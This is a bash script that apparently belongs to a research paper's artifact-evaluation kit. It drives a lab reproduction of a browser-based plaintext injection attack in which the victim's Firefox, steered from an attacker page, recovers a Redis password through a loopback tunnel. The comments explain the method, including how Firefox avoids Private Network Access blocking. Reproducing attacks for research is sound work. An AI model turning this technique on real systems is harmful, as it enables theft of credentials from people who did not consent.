#!/usr/bin/env bash
#
# Scenario 2 -- Browser-based plaintext injection (paper Section 5.2).
#
# The victim's headless Firefox loads an attacker-served page that calls
# navigator.sendBeacon() at a loopback-bound port forward. The attacker
# never speaks to the tunnel directly; every guess is carried by the
# victim's own browser.
#
#   ./artifact-evaluation/scenario2_browser.sh
#   ./artifact-evaluation/scenario2_browser.sh --commit-margin 96
#
# Any extra arguments are passed through to scripts/verify_browser.py.
# This is by far the slowest scenario: expect 60-90 minutes. A single
# byte took 635 s at mu = 88 on Docker Desktop for macOS.
#
# Firefox is required (not Chromium/WebKit): the page origin is
# http://attacker:9000 and the beacon target is http://localhost:6379, a
# public->loopback request that Chromium and WebKit drop the body of under
# Private Network Access.

source "$(dirname "${BASH_SOURCE[0]}")/_common.sh"

# The browser adapter defaults to 64, but with adaptive alignment sweep +
# candidate elimination (the AS+CE cell of Table 3) the repo's own sweep
# data (evaluation/browser/as+ce/) only reaches 100/100 at mu = 88; at
# mu = 64 it recovers 48/100. So we default to the converged value.
DEFAULT_COMMIT_MARGIN="${AE_COMMIT_MARGIN:-88}"

say "Scenario 2: browser-based plaintext injection (Section 5.2)"
info "target secret : hunter2 (Redis AUTH password)"
info "commit margin : $DEFAULT_COMMIT_MARGIN (converged value for browser AS+CE)"

ensure_stack

# The browser has to be attached to the attacker's WebSocket bridge before
# the attack can drive it. The client launches it at container start.
say "Checking the victim browser is attached"
"$PY" - <<'PYEOF' || die "browser not connected; try: docker compose restart client"
import json, sys, time, urllib.request
def get(u):
    with urllib.request.urlopen(u, timeout=5) as r:
        return json.loads(r.read())
for _ in range(60):
    try:
        if get("http://127.0.0.1:9000/status").get("browser_connected"):
            print("    browser attached to the attacker WebSocket bridge")
            sys.exit(0)
    except Exception:
        pass
    time.sleep(2)
sys.exit(1)
PYEOF

set +e
"$PY" scripts/verify_browser.py \
    --commit-margin "$DEFAULT_COMMIT_MARGIN" \
    --fail-fast \
    "$@"
rc=$?
set -e

if [ "$rc" -ne 0 ]; then
    cat <<'EOF'

Recovery did not reproduce. Raise the commit margin in 8-byte steps:

    ./artifact-evaluation/scenario2_browser.sh --commit-margin 104

If the browser dropped off mid-run, restart the client and retry:

    docker compose restart client

See ARTIFACT-EVALUATION.md, "Tuning the commit margin".
EOF
fi

banner_result "$rc" "Scenario 2 (browser)"
